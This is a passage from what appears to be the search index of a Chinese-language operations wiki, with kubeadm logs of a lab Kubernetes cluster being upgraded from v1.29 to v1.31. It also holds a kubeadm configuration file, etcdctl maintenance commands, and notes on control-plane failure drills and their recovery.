Namespace\n[kubelet] Creating a ConfigMap \"kubelet-config\" in namespace kube-system with the configuration for the kubelets in the cluster\n[upgrade] Backing up kubelet config file to /etc/kubernetes/tmp/kubeadm-kubelet-config1436888073/config.yaml\n[kubelet-start] Writing kubelet configuration to file \"/var/lib/kubelet/config.yaml\"\n[kubeconfig] Writing \"admin.conf\" kubeconfig file\n[kubeconfig] Writing \"super-admin.conf\" kubeconfig file\n[bootstrap-token] Configured RBAC rules to allow Node Bootstrap tokens to get nodes\n[bootstrap-token] Configured RBAC rules to allow Node Bootstrap tokens to post CSRs in order for nodes to get long term certificate credentials\n[bootstrap-token] Configured RBAC rules to allow the csrapprover controller automatically approve CSRs from a Node Bootstrap Token\n[bootstrap-token] Configured RBAC rules to allow certificate rotation for all node client certificates in the cluster\n[upgrade/addons] skip upgrade addons because control plane instances [k-kube-lab-02 k-kube-lab-03] have not been upgraded\n\n[upgrade/successful] SUCCESS! Your cluster was upgraded to \"v1.29.9\". Enjoy!\n\n[upgrade/kubelet] Now that your control plane is upgraded, please proceed with upgrading your kubelets if you haven't already done so.\n</code></pre>"},{"location":"kubernetes/06-cluster-upgrade-1.26/#35-v130","title":"3.5 v1.30","text":"<pre><code>root@K-KUBE-LAB-01:/opt/kubernetes# kubeadm upgrade plan\n[preflight] Running pre-flight checks.\n[upgrade/config] Reading configuration from the cluster...\n[upgrade/config] FYI: You can look at this config file with 'kubectl -n kube-system get cm kubeadm-config -o yaml'\n[upgrade] Running cluster health checks\n[upgrade] Fetching available versions to upgrade to\n[upgrade/versions] Cluster version: 1.29.9\n[upgrade/versions] kubeadm version: v1.30.5\nI0923 10:28:56.609571  853576 version.go:256] remote version is much newer: v1.31.1; falling back to: stable-1.30\n[upgrade/versions] Target version: v1.30.5\n[upgrade/versions] Latest version in the v1.29 series: v1.29.9\n\nComponents that must be upgraded manually after you have upgraded the control plane with 'kubeadm upgrade apply':\nCOMPONENT   NODE            CURRENT   TARGET\nkubelet     k-kube-lab-01   v1.29.9   v1.30.5\nkubelet     k-kube-lab-02   v1.29.9   v1.30.5\nkubelet     k-kube-lab-03   v1.29.9   v1.30.5\nkubelet     k-kube-lab-11   v1.29.9   v1.30.5\nkubelet     k-kube-lab-12   v1.29.9   v1.30.5\n\nUpgrade to the latest stable version:\n\nCOMPONENT                 NODE            CURRENT    TARGET\nkube-apiserver            k-kube-lab-01   v1.29.9    v1.30.5\nkube-apiserver            k-kube-lab-02   v1.29.9    v1.30.5\nkube-apiserver            k-kube-lab-03   v1.29.9    v1.30.5\nkube-controller-manager   k-kube-lab-01   v1.29.9    v1.30.5\nkube-controller-manager   k-kube-lab-02   v1.29.9    v1.30.5\nkube-controller-manager   k-kube-lab-03   v1.29.9    v1.30.5\nkube-scheduler            k-kube-lab-01   v1.29.9    v1.30.5\nkube-scheduler            k-kube-lab-02   v1.29.9    v1.30.5\nkube-scheduler            k-kube-lab-03   v1.29.9    v1.30.5\nkube-proxy                                1.29.9     v1.30.5\nCoreDNS                                   v1.11.1    v1.11.3\netcd                      k-kube-lab-01   3.5.15-0   3.5.15-0\netcd                      k-kube-lab-02   3.5.15-0   3.5.15-0\netcd                      k-kube-lab-03   3.5.15-0   3.5.15-0\n\nYou can now apply the upgrade by executing the following command:\n\n    kubeadm upgrade apply v1.30.5\n\n_____________________________________________________________________\n\n\nThe table below shows the current state of component configs as understood by this version of kubeadm.\nConfigs that have a \"yes\" mark in the \"MANUAL UPGRADE REQUIRED\" column require manual config upgrade or\nresetting to kubeadm defaults before a successful upgrade can be performed. The version to manually\nupgrade to is denoted in the \"PREFERRED VERSION\" column.\n\nAPI GROUP                 CURRENT VERSION   PREFERRED VERSION   MANUAL UPGRADE REQUIRED\nkubeproxy.config.k8s.io   v1alpha1          v1alpha1            no\nkubelet.config.k8s.io     v1beta1           v1beta1             no\n_____________________________________________________________________\n\nroot@K-KUBE-LAB-01:/opt/kubernetes# kubeadm config images list\nW0923 10:24:34.296784  850350 version.go:104] could not fetch a Kubernetes version from the internet: unable to get URL \"https://dl.k8s.io/release/stable-1.txt\": Get \"https://cdn.dl.k8s.io/release/stable-1.txt\": context deadline exceeded (Client.Timeout exceeded while awaiting headers)\nW0923 10:24:34.297080  850350 version.go:105] falling back to the local client version: v1.30.5\nregistry.k8s.io/kube-apiserver:v1.30.5\nregistry.k8s.io/kube-controller-manager:v1.30.5\nregistry.k8s.io/kube-scheduler:v1.30.5\nregistry.k8s.io/kube-proxy:v1.30.5\nregistry.k8s.io/coredns/coredns:v1.11.3\nregistry.k8s.io/pause:3.9\nregistry.k8s.io/etcd:3.5.15-0\n\nroot@K-KUBE-LAB-01:/opt/kubernetes# kubeadm config images list --config kubeadm-init.yaml-${KUBE_VERSION}\nhub.8ops.top/google_containers/kube-apiserver:v1.29.9\nhub.8ops.top/google_containers/kube-controller-manager:v1.29.9\nhub.8ops.top/google_containers/kube-scheduler:v1.29.9\nhub.8ops.top/google_containers/kube-proxy:v1.29.9\nhub.8ops.top/google_containers/coredns:v1.11.3\nhub.8ops.top/google_containers/pause:3.9\nhub.8ops.top/google_containers/etcd:3.5.15-0\n\nroot@K-KUBE-LAB-01:/opt/kubernetes# kubeadm upgrade apply ${KUBE_VERSION} --config kubeadm-init.yaml-${KUBE_VERSION}\nW0923 10:31:34.298894  855740 upgradeconfiguration.go:58] [config] WARNING: YAML document with GroupVersionKind kubeadm.k8s.io/v1beta3, Kind=InitConfiguration is deprecated for upgrade, please use config file with kind of UpgradeConfiguration instead\nW0923 10:31:34.299781  855740 upgradeconfiguration.go:58] [config] WARNING: YAML document with GroupVersionKind kubeadm.k8s.io/v1beta3, Kind=ClusterConfiguration is deprecated for upgrade, please use config file with kind of UpgradeConfiguration instead\nW0923 10:31:34.300050  855740 upgradeconfiguration.go:54] unknown configuration schema.GroupVersionKind{Group:\"kubelet.config.k8s.io\", Version:\"v1beta1\", Kind:\"KubeletConfiguration\"}\nW0923 10:31:34.300175  855740 upgradeconfiguration.go:54] unknown configuration schema.GroupVersionKind{Group:\"kubeproxy.config.k8s.io\", Version:\"v1alpha1\", Kind:\"KubeProxyConfiguration\"}\nW0923 10:31:34.300301  855740 upgradeconfiguration.go:135] [config] WARNING: YAML document with Component Configs kubelet.config.k8s.io is deprecated for upgrade and will be ignored\nW0923 10:31:34.300321  855740 upgradeconfiguration.go:135] [config] WARNING: YAML document with Component Configs kubeproxy.config.k8s.io is deprecated for upgrade and will be ignored\n[preflight] Running pre-flight checks.\n[upgrade/config] Reading configuration from the cluster...\n[upgrade/config] FYI: You can look at this config file with 'kubectl -n kube-system get cm kubeadm-config -o yaml'\n[upgrade] Running cluster health checks\n[upgrade/version] You have chosen to change the cluster version to \"v1.30.5\"\n[upgrade/versions] Cluster version: v1.29.9\n[upgrade/versions] kubeadm version: v1.30.5\n[upgrade] Are you sure you want to proceed? [y/N]: y\n[upgrade/prepull] Pulling images required for setting up a Kubernetes cluster\n[upgrade/prepull] This might take a minute or two, depending on the speed of your internet connection\n[upgrade/prepull] You can also perform this action in beforehand using 'kubeadm config images pull'\n[upgrade/apply] Upgrading your Static Pod-hosted control plane to version \"v1.30.5\" (timeout: 5m0s)...\n[upgrade/etcd] Upgrading to TLS for etcd\n[upgrade/staticpods] Preparing for \"etcd\" upgrade\n[upgrade/staticpods] Current and new manifests of etcd are equal, skipping upgrade\n[upgrade/etcd] Waiting for etcd to become available\n[upgrade/staticpods] Writing new Static Pod manifests to \"/etc/kubernetes/tmp/kubeadm-upgraded-manifests3412817232\"\n[upgrade/staticpods] Preparing for \"kube-apiserver\" upgrade\n[upgrade/staticpods] Renewing apiserver certificate\n[upgrade/staticpods] Renewing apiserver-kubelet-client certificate\n[upgrade/staticpods] Renewing front-proxy-client certificate\n[upgrade/staticpods] Renewing apiserver-etcd-client certificate\n[upgrade/staticpods] Moved new manifest to \"/etc/kubernetes/manifests/kube-apiserver.yaml\" and backed up old manifest to \"/etc/kubernetes/tmp/kubeadm-backup-manifests-2024-09-23-10-32-00/kube-apiserver.yaml\"\n[upgrade/staticpods] Waiting for the kubelet to restart the component\n[upgrade/staticpods] This can take up to 5m0s\n[apiclient] Found 3 Pods for label selector component=kube-apiserver\n[upgrade/staticpods] Component \"kube-apiserver\" upgraded successfully!\n[upgrade/staticpods] Preparing for \"kube-controller-manager\" upgrade\n[upgrade/staticpods] Renewing controller-manager.conf certificate\n[upgrade/staticpods] Moved new manifest to \"/etc/kubernetes/manifests/kube-controller-manager.yaml\" and backed up old manifest to \"/etc/kubernetes/tmp/kubeadm-backup-manifests-2024-09-23-10-32-00/kube-controller-manager.yaml\"\n[upgrade/staticpods] Waiting for the kubelet to restart the component\n[upgrade/staticpods] This can take up to 5m0s\n[apiclient] Found 3 Pods for label selector component=kube-controller-manager\n[upgrade/staticpods] Component \"kube-controller-manager\" upgraded successfully!\n[upgrade/staticpods] Preparing for \"kube-scheduler\" upgrade\n[upgrade/staticpods] Renewing scheduler.conf certificate\n[upgrade/staticpods] Moved new manifest to \"/etc/kubernetes/manifests/kube-scheduler.yaml\" and backed up old manifest to \"/etc/kubernetes/tmp/kubeadm-backup-manifests-2024-09-23-10-32-00/kube-scheduler.yaml\"\n[upgrade/staticpods] Waiting for the kubelet to restart the component\n[upgrade/staticpods] This can take up to 5m0s\n[apiclient] Found 3 Pods for label selector component=kube-scheduler\n[upgrade/staticpods] Component \"kube-scheduler\" upgraded successfully!\n[upload-config] Storing the configuration used in ConfigMap \"kubeadm-config\" in the \"kube-system\" Namespace\n[kubelet] Creating a ConfigMap \"kubelet-config\" in namespace kube-system with the configuration for the kubelets in the cluster\n[upgrade] Backing up kubelet config file to /etc/kubernetes/tmp/kubeadm-kubelet-config867235545/config.yaml\n[kubelet-start] Writing kubelet configuration to file \"/var/lib/kubelet/config.yaml\"\n[bootstrap-token] Configured RBAC rules to allow Node Bootstrap tokens to get nodes\n[bootstrap-token] Configured RBAC rules to allow Node Bootstrap tokens to post CSRs in order for nodes to get long term certificate credentials\n[bootstrap-token] Configured RBAC rules to allow the csrapprover controller automatically approve CSRs from a Node Bootstrap Token\n[bootstrap-token] Configured RBAC rules to allow certificate rotation for all node client certificates in the cluster\n[upgrade/addons] skip upgrade addons because control plane instances [k-kube-lab-02 k-kube-lab-03] have not been upgraded\n\n[upgrade/successful] SUCCESS! Your cluster was upgraded to \"v1.30.5\". Enjoy!\n\n[upgrade/kubelet] Now that your control plane is upgraded, please proceed with upgrading your kubelets if you haven't already done so.\n</code></pre>"},{"location":"kubernetes/06-cluster-upgrade-1.26/#36-v131","title":"3.6 v1.31","text":"<pre><code>root@K-KUBE-LAB-01:/opt/kubernetes# kubeadm upgrade plan\n[preflight] Running pre-flight checks.\n[upgrade/config] Reading configuration from the cluster...\n[upgrade/config] FYI: You can look at this config file with 'kubectl -n kube-system get cm kubeadm-config -o yaml'\n[upgrade] Running cluster health checks\n[upgrade] Fetching available versions to upgrade to\n[upgrade/versions] Cluster version: 1.30.5\n[upgrade/versions] kubeadm version: v1.31.1\nW0923 10:50:43.406796  874469 version.go:109] could not fetch a Kubernetes version from the internet: unable to get URL \"https://dl.k8s.io/release/stable.txt\": Get \"https://cdn.dl.k8s.io/release/stable.txt\": context deadline exceeded (Client.Timeout exceeded while awaiting headers)\nW0923 10:50:43.407129  874469 version.go:110] falling back to the local client version: v1.31.1\n[upgrade/versions] Target version: v1.31.1\n[upgrade/versions] Latest version in the v1.30 series: v1.30.5\n\nComponents that must be upgraded manually after you have upgraded the control plane with 'kubeadm upgrade apply':\nCOMPONENT   NODE            CURRENT   TARGET\nkubelet     k-kube-lab-01   v1.30.5   v1.31.1\nkubelet     k-kube-lab-02   v1.30.5   v1.31.1\nkubelet     k-kube-lab-03   v1.30.5   v1.31.1\nkubelet     k-kube-lab-11   v1.30.5   v1.31.1\nkubelet     k-kube-lab-12   v1.30.5   v1.31.1\n\nUpgrade to the latest stable version:\n\nCOMPONENT                 NODE            CURRENT    TARGET\nkube-apiserver            k-kube-lab-01   v1.30.5    v1.31.1\nkube-apiserver            k-kube-lab-02   v1.30.5    v1.31.1\nkube-apiserver            k-kube-lab-03   v1.30.5    v1.31.1\nkube-controller-manager   k-kube-lab-01   v1.30.5    v1.31.1\nkube-controller-manager   k-kube-lab-02   v1.30.5    v1.31.1\nkube-controller-manager   k-kube-lab-03   v1.30.5    v1.31.1\nkube-scheduler            k-kube-lab-01   v1.30.5    v1.31.1\nkube-scheduler            k-kube-lab-02   v1.30.5    v1.31.1\nkube-scheduler            k-kube-lab-03   v1.30.5    v1.31.1\nkube-proxy                                1.30.5     v1.31.1\nCoreDNS                                   v1.11.1    v1.11.3\netcd                      k-kube-lab-01   3.5.15-0   3.5.15-0\netcd                      k-kube-lab-02   3.5.15-0   3.5.15-0\netcd                      k-kube-lab-03   3.5.15-0   3.5.15-0\n\nYou can now apply the upgrade by executing the following command:\n\n    kubeadm upgrade apply v1.31.1\n\n_____________________________________________________________________\n\n\nThe table below shows the current state of component configs as understood by this version of kubeadm.\nConfigs that have a \"yes\" mark in the \"MANUAL UPGRADE REQUIRED\" column require manual config upgrade or\nresetting to kubeadm defaults before a successful upgrade can be performed. The version to manually\nupgrade to is denoted in the \"PREFERRED VERSION\" column.\n\nAPI GROUP                 CURRENT VERSION   PREFERRED VERSION   MANUAL UPGRADE REQUIRED\nkubeproxy.config.k8s.io   v1alpha1          v1alpha1            no\nkubelet.config.k8s.io     v1beta1           v1beta1             no\n_____________________________________________________________________\n\nroot@K-KUBE-LAB-01:/opt/kubernetes# kubeadm config images list\nregistry.k8s.io/kube-apiserver:v1.31.0\nregistry.k8s.io/kube-controller-manager:v1.31.0\nregistry.k8s.io/kube-scheduler:v1.31.0\nregistry.k8s.io/kube-proxy:v1.31.0\nregistry.k8s.io/coredns/coredns:v1.11.3\nregistry.k8s.io/pause:3.10\nregistry.k8s.io/etcd:3.5.15-0\n\nroot@K-KUBE-LAB-01:/opt/kubernetes# kubeadm config images list --config kubeadm-init.yaml-${KUBE_VERSION}\nW0923 11:04:12.068845  884729 validation.go:79] WARNING: certificateValidityPeriod: the value 17520h0m0s is more than the recommended default for certificate expiration: 8760h0m0s\nhub.8ops.top/google_containers/kube-apiserver:v1.31.1\nhub.8ops.top/google_containers/kube-controller-manager:v1.31.1\nhub.8ops.top/google_containers/kube-scheduler:v1.31.1\nhub.8ops.top/google_containers/kube-proxy:v1.31.1\nhub.8ops.top/google_containers/coredns:v1.11.3\nhub.8ops.top/google_containers/pause:3.10\nhub.8ops.top/google_containers/etcd:3.5.15-0\n\nroot@K-KUBE-LAB-01:/opt/kubernetes# kubeadm upgrade apply ${KUBE_VERSION} --config kubeadm-init.yaml-${KUBE_VERSION}\nW0923 11:24:11.186140  899501 upgradeconfiguration.go:58] [config] WARNING: YAML document with GroupVersionKind kubeadm.k8s.io/v1beta4, Kind=InitConfiguration is deprecated for upgrade, please use config file with kind of UpgradeConfiguration instead\nW0923 11:24:11.186411  899501 upgradeconfiguration.go:54] unknown configuration schema.GroupVersionKind{Group:\"kubeproxy.config.k8s.io\", Version:\"v1beta1\", Kind:\"KubeProxyConfiguration\"}\nW0923 11:24:11.186477  899501 upgradeconfiguration.go:135] [config] WARNING: YAML document with Component Configs kubeproxy.config.k8s.io is deprecated for upgrade and will be ignored\n[preflight] Running pre-flight checks.\n[upgrade/config] Reading configuration from the cluster...\n[upgrade/config] FYI: You can look at this config file with 'kubectl -n kube-system get cm kubeadm-config -o yaml'\n[upgrade] Running cluster health checks\n[upgrade/version] You have chosen to change the cluster version to \"v1.31.1\"\n[upgrade/versions] Cluster version: v1.30.5\n[upgrade/versions] kubeadm version: v1.31.1\n[upgrade] Are you sure you want to proceed? [y/N]: y\n[upgrade/prepull] Pulling images required for setting up a Kubernetes cluster\n[upgrade/prepull] This might take a minute or two, depending on the speed of your internet connection\n[upgrade/prepull] You can also perform this action beforehand using 'kubeadm config images pull'\nW0923 11:24:26.430142  899501 checks.go:846] detected that the sandbox image \"hub.8ops.top/google_containers/pause:3.9\" of the container runtime is inconsistent with that used by kubeadm.It is recommended to use \"hub.8ops.top/google_containers/pause:3.10\" as the CRI sandbox image.\n[upgrade/apply] Upgrading your Static Pod-hosted control plane to version \"v1.31.1\" (timeout: 5m0s)...\n[upgrade/staticpods] Writing new Static Pod manifests to \"/etc/kubernetes/tmp/kubeadm-upgraded-manifests880503637\"\n[upgrade/staticpods] Preparing for \"etcd\" upgrade\n[upgrade/staticpods] Renewing etcd-server certificate\n[upgrade/staticpods] Renewing etcd-peer certificate\n[upgrade/staticpods] Renewing etcd-healthcheck-client certificate\n[upgrade/staticpods] Moving new manifest to \"/etc/kubernetes/manifests/etcd.yaml\" and backing up old manifest to \"/etc/kubernetes/tmp/kubeadm-backup-manifests-2024-09-23-11-24-26/etcd.yaml\"\n[upgrade/staticpods] Waiting for the kubelet to restart the component\n[upgrade/staticpods] This can take up to 5m0s\n[apiclient] Found 3 Pods for label selector component=etcd\n[upgrade/staticpods] Component \"etcd\" upgraded successfully!\n[upgrade/etcd] Waiting for etcd to become available\n[upgrade/staticpods] Preparing for \"kube-apiserver\" upgrade\n[upgrade/staticpods] Renewing apiserver certificate\n[upgrade/staticpods] Renewing apiserver-kubelet-client certificate\n[upgrade/staticpods] Renewing front-proxy-client certificate\n[upgrade/staticpods] Renewing apiserver-etcd-client certificate\n[upgrade/staticpods] Moving new manifest to \"/etc/kubernetes/manifests/kube-apiserver.yaml\" and backing up old manifest to \"/etc/kubernetes/tmp/kubeadm-backup-manifests-2024-09-23-11-24-26/kube-apiserver.yaml\"\n[upgrade/staticpods] Waiting for the kubelet to restart the component\n[upgrade/staticpods] This can take up to 5m0s\n[apiclient] Found 3 Pods for label selector component=kube-apiserver\n[upgrade/staticpods] Component \"kube-apiserver\" upgraded successfully!\n[upgrade/staticpods] Preparing for \"kube-controller-manager\" upgrade\n[upgrade/staticpods] Renewing controller-manager.conf certificate\n[upgrade/staticpods] Moving new manifest to \"/etc/kubernetes/manifests/kube-controller-manager.yaml\" and backing up old manifest to \"/etc/kubernetes/tmp/kubeadm-backup-manifests-2024-09-23-11-24-26/kube-controller-manager.yaml\"\n[upgrade/staticpods] Waiting for the kubelet to restart the component\n[upgrade/staticpods] This can take up to 5m0s\n[apiclient] Found 3 Pods for label selector component=kube-controller-manager\n[upgrade/staticpods] Component \"kube-controller-manager\" upgraded successfully!\n[upgrade/staticpods] Preparing for \"kube-scheduler\" upgrade\n[upgrade/staticpods] Renewing scheduler.conf certificate\n[upgrade/staticpods] Moving new manifest to \"/etc/kubernetes/manifests/kube-scheduler.yaml\" and backing up old manifest to \"/etc/kubernetes/tmp/kubeadm-backup-manifests-2024-09-23-11-24-26/kube-scheduler.yaml\"\n[upgrade/staticpods] Waiting for the kubelet to restart the component\n[upgrade/staticpods] This can take up to 5m0s\n[apiclient] Found 3 Pods for label selector component=kube-scheduler\n[upgrade/staticpods] Component \"kube-scheduler\" upgraded successfully!\n[upload-config] Storing the configuration used in ConfigMap \"kubeadm-config\" in the \"kube-system\" Namespace\n[kubelet] Creating a ConfigMap \"kubelet-config\" in namespace kube-system with the configuration for the kubelets in the cluster\n[upgrade] Backing up kubelet config file to /etc/kubernetes/tmp/kubeadm-kubelet-config3650563448/config.yaml\n[kubelet-start] Writing kubelet configuration to file \"/var/lib/kubelet/config.yaml\"\n[bootstrap-token] Configured RBAC rules to allow Node Bootstrap tokens to get nodes\n[bootstrap-token] Configured RBAC rules to allow Node Bootstrap tokens to post CSRs in order for nodes to get long term certificate credentials\n[bootstrap-token] Configured RBAC rules to allow the csrapprover controller automatically approve CSRs from a Node Bootstrap Token\n[bootstrap-token] Configured RBAC rules to allow certificate rotation for all node client certificates in the cluster\n[upgrade/addons] skip upgrade addons because control plane instances [k-kube-lab-02 k-kube-lab-03] have not been upgraded\n\n[upgrade/successful] SUCCESS! Your cluster was upgraded to \"v1.31.1\". Enjoy!\n\n[upgrade/kubelet] Now that your control plane is upgraded, please proceed with upgrading your kubelets if you haven't already done so.\n</code></pre> <p>vim kubeadm-init.yaml-v1.31.1</p> <p>Reference</p> <p>kubeadm.yaml \u6709\u53d8\u66f4</p> <pre><code>apiVersion: kubeadm.k8s.io/v1beta4\nbootstrapTokens:\n- groups:\n  - system:bootstrappers:kubeadm:default-node-token\n  token: abcdef.0123456789abcdef\n  ttl: 24h0m0s\n  usages:\n  - signing\n  - authentication\nkind: InitConfiguration\nlocalAPIEndpoint:\n  advertiseAddress: 10.101.11.240\n  bindPort: 6443\nnodeRegistration:\n  criSocket: unix:///var/run/containerd/containerd.sock\n  imagePullPolicy: IfNotPresent\n  imagePullSerial: true\n  name: K-KUBE-LAB-01\n  taints: null\ntimeouts:\n  controlPlaneComponentHealthCheck: 4m0s\n  discovery: 5m0s\n  etcdAPICall: 2m0s\n  kubeletHealthCheck: 4m0s\n  kubernetesAPICall: 1m0s\n  tlsBootstrap: 5m0s\n  upgradeManifests: 5m0s\n---\napiServer: {}\napiVersion: kubeadm.k8s.io/v1beta4\ncaCertificateValidityPeriod: 87600h0m0s\ncertificateValidityPeriod: 8760h0m0s\ncertificatesDir: /etc/kubernetes/pki\nclusterName: kubernetes\ncontrollerManager: {}\ndns:\n  imageRepository: hub.8ops.top/google_containers\n  imageTag: v1.11.3\nencryptionAlgorithm: RSA-2048\netcd:\n  local:\n    dataDir: /var/lib/etcd\nimageRepository: hub.8ops.top/google_containers\nkind: ClusterConfiguration\nkubernetesVersion: 1.31.1\ncontrolPlaneEndpoint: 10.101.11.110:6443\nnetworking:\n  dnsDomain: cluster.local\n  podSubnet: 172.19.0.0/16\n  serviceSubnet: 192.168.0.0/16\nproxy: {}\nscheduler: {}\n---\napiVersion: kubeproxy.config.k8s.io/v1beta1\nkind: KubeProxyConfiguration\nmode: \"ipvs\"\nipvs:\n  minSyncPeriod: 5s\n  syncPeriod: 5s\n  scheduler: \"rr\"\n  strictARP: true\nfeatureGates:\n  SupportIPVSProxyMode: true\n</code></pre>"},{"location":"kubernetes/06-cluster-upgrade-qa/","title":"\u5e38\u89c1\u95ee\u9898","text":""},{"location":"kubernetes/06-cluster-upgrade-qa/#_2","title":"\u4e00\u3001\u4fe1\u606f\u67e5\u770b","text":"<p>\u8282\u70b9\u4fe1\u606f</p> <pre><code>K-KUBE-LAB-01 10.101.11.240\nK-KUBE-LAB-02 10.101.11.114\nK-KUBE-LAB-03 10.101.11.154\n\nK-KUBE-LAB-201 10.101.11.238\nK-KUBE-LAB-202 10.101.11.93\nK-KUBE-LAB-203 10.101.11.53\n</code></pre> <p>kubernetes \u6240\u6709\u7ec4\u4ef6\u4e2d\u53ea\u4f1a\u6709 ETCD \u5b58\u5728 leader \u9009\u4e3e</p> <pre><code>cd /etc/kubernetes\nrsync -av manifests/ manifests-20230310/\nrsync -av manifests-20230310/ manifests/\n\n# The items in the lists are endpoint, ID, version, db size, is leader, is learner, raft term, raft index, raft applied index, errors.\netcdctl member list -w table \\\n  --endpoints=https://10.101.11.114:2379 \\\n  --cacert=/etc/kubernetes/pki/etcd/ca.crt \\\n  --cert=/etc/kubernetes/pki/etcd/server.crt \\\n  --key=/etc/kubernetes/pki/etcd/server.key\n\netcdctl endpoint status -w table \\\n  --cluster \\\n  --cacert=/etc/kubernetes/pki/etcd/ca.crt \\\n  --cert=/etc/kubernetes/pki/etcd/server.crt \\\n  --key=/etc/kubernetes/pki/etcd/server.key\n\netcdctl endpoint status -w table \\\n  --cluster \\\n  --endpoints=https://10.101.11.114:2379 \\\n  --cacert=/etc/kubernetes/pki/etcd/ca.crt \\\n  --cert=/etc/kubernetes/pki/etcd/server.crt \\\n  --key=/etc/kubernetes/pki/etcd/server.key\n\n# \u5207\u6362leader\netcdctl move-leader ed1afb9abd383490 \\\n  --endpoints=https://10.101.11.240:2379 \\\n  --cacert=/etc/kubernetes/pki/etcd/ca.crt \\\n  --cert=/etc/kubernetes/pki/etcd/server.crt \\\n  --key=/etc/kubernetes/pki/etcd/server.key\n\netcdctl member remove 99bb4ff3ed8558ca \\\n  --endpoints=https://10.101.11.114:2379 \\\n  --cacert=/etc/kubernetes/pki/etcd/ca.crt \\\n  --cert=/etc/kubernetes/pki/etcd/server.crt \\\n  --key=/etc/kubernetes/pki/etcd/server.key\n\netcdctl member add k-kube-lab-201 \\\n  --endpoints=https://10.101.11.114:2379 \\\n  --peer-urls=https://10.101.11.238:2379 \\\n  --cacert=/etc/kubernetes/pki/etcd/ca.crt \\\n  --cert=/etc/kubernetes/pki/etcd/server.crt \\\n  --key=/etc/kubernetes/pki/etcd/server.key\n</code></pre>"},{"location":"kubernetes/06-cluster-upgrade-qa/#mock","title":"\u4e8c\u3001MOCK\u573a\u666f","text":"<p>kubernetes cluster \u5728\u8fd0\u884c\u8fc7\u7a0b\u4e2d\u4f1a\u6709\u5f88\u591a\u5f02\u5e38\u60c5\u51b5\uff0c\u6b64\u5904\u7528\u4e8e\u6a21\u62df\u5f02\u5e38\u5e76\u5c1d\u8bd5\u6062\u590d\u3002</p> <p>\u5f53control-plane\u4e0d\u53ef\u7528\u65f6\uff0c\u96c6\u7fa4\u4e2d\u4e1a\u52a1\u7684pod\u4e0d\u53d7\u5f71\u54cd\uff0c\u6d41\u91cf\u6b63\u5e38\u63a5\u5165\u3002</p>"},{"location":"kubernetes/06-cluster-upgrade-qa/#21-control-plane","title":"2.1 \u7ec8\u6b62\u90e8\u5206control-plane\u8282\u70b9","text":"<p>\u53ef\u884c</p> control-plane\u8282\u70b9\u6570 \u5141\u8bb8\u5f02\u5e38\u8282\u70b9 3 1 4 1 5 2 6 2 7 3 8 3 9 5 <p>\u6a21\u62df\u6545\u969c</p> <pre><code># \u51713\u53f0control-plane\n\n#1\uff0c\u505c\u7b2c1\u53f0\u9759\u6001\u5bb9\u5668\ncd /etc/kubernetes\nmv manifests manifests-20230310\n# \u73b0\u8c61\uff1a\u96c6\u7fa4\u6b63\u5e38\uff0cetcd leader \u98d8\u79fb\n# \u539f\u56e0\uff1aetcd leader \u6210\u529f\u98d8\u79fb\uff08etcd leader \u521a\u597d\u5728\u505c\u6389\u7684\u8282\u70b9\u4e0a\uff09\n\n#2\uff0c\u505c\u7b2c2\u53f0\u9759\u6001\u5bb9\u5668\ncd /etc/kubernetes\nmv manifests manifests-20230310\n# \u73b0\u8c61\uff1a\u96c6\u7fa4\u5d29\u6e83\uff0cetcd leader \u6d88\u5931\n# \u539f\u56e0\uff1aetcd learner/leader \u89d2\u8272\u672a\u53d1\u751f\u53d8\u5316\uff0cetcd luster\u8282\u70b9\u6570\u91cf\u5c0f\u4e8e2 etcd \u96c6\u7fa4\u4e0d\u5b58\u5728leader\u65e0\u6cd5\u6b63\u5e38\u5de5\u4f5c\n</code></pre> <p>\u6062\u590d\u6545\u969c</p> <pre><code>#1\uff0c\u6062\u590d\u7b2c2\u53f0\u9759\u6001\u5bb9\u5668\ncd /etc/kubernetes\nrsync -av manifests-20230310/ manifests/\n# \u73b0\u8c61\uff1a\u96c6\u7fa4\u6b63\u5e38\uff0cetcd leader \u51fa\u73b0\n# \u539f\u56e0\uff1aetcd leader \u672a\u53d1\u751f\u98d8\u79fb \uff0cetcd luster\u8282\u70b9\u6570\u91cf\u4e3a2\n\n#2\uff0c\u6062\u590d\u7b2c1\u53f0\u9759\u6001\u5bb9\u5668\ncd /etc/kubernetes\nrsync -av manifests-20230310/ manifests/\n# \u73b0\u8c61\uff1a\u96c6\u7fa4\u6b63\u5e38\n</code></pre>"},{"location":"kubernetes/06-cluster-upgrade-qa/#22-control-plane","title":"2.2 \u7ec8\u6b62\u5168\u90e8 control-plane \u8282\u70b9","text":"<p>\u4e0d\u53ef\u884c</p> <pre><code># \u53c2\u8003\u573a\u666f\u4e00\uff0c\u5f53\u6062\u590d\u5230\u7b2c2\u53f0 control-plane \u65f6\u96c6\u7fa4\u6062\u590d\u53ef\u7528\u3002\n</code></pre>"},{"location":"kubernetes/06-cluster-upgrade-qa/#23","title":"2.3 \u632a\u7528\u5176\u4ed6\u8282\u70b9\u8bc1\u4e66\u6062\u590d","text":"<p>\u4e0d\u53ef\u884c</p> <p>\u6a21\u62df\u6545\u969c</p> <pre><code># \u5728\u5176\u4e2d\u4e00\u4e2a\u8282\u70b9\u4e0a\u64cd\u4f5c\n\n#1\uff0c\u505c\u6389control-plane\ncd /etc/kubernetes\nmv manifests manifests-20230310\n# \u73b0\u8c61\uff1a\u96c6\u7fa4\u6b63\u5e38\uff0c\u6458\u63891\u4e2acontrol-plane\n\n#2\uff0c\u5907\u4efd\u8bc1\u4e66\nmv pki pki-20230310\n</code></pre> <p>\u6062\u590d\u6545\u969c</p> <pre><code>#1\uff0c\u4ece\u5176\u4ed6\u8282\u70b9\u6062\u590d\u8bc1\u4e66\nscp /etc/kubernetes/pki\n\n#2\uff0c\u6062\u590dcontrol-plane\ncd /etc/kubernetes\nrsync -av manifests-20230310/ manifests/\n# \u73b0\u8c61\uff1a\u96c6\u7fa4\u6b63\u5e38\uff0c\u6458\u6389control-plane\u672a\u6062\u590d\n# \u539f\u56e0\uff1a\u62f7\u8d1d\u8fc7\u6765\u7684\u8bc1\u4e66\u7b7e\u540d\u4e2d X509v3 Subject Alternative Name \u672a\u5305\u542b\u5f53\u524d\u8282\u70b9\u4fe1\u606f\n</code></pre>"},{"location":"kubernetes/06-cluster-upgrade-qa/#24-join","title":"2.4 \u5f53\u96c6\u7fa4\u4e0d\u53ef\u7528\u65f6 join \u65b0\u8282\u70b9","text":"<p>\u4e0d\u53ef\u884c</p> <p>\u6062\u590d\u6545\u969c</p> <pre><code>kubeadm init phase upload-certs --upload-certs\n\n# I0310 17:40:27.320512 1479993 version.go:256] remote version is much newer: v1.26.2; falling back to: stable-1.25\n# 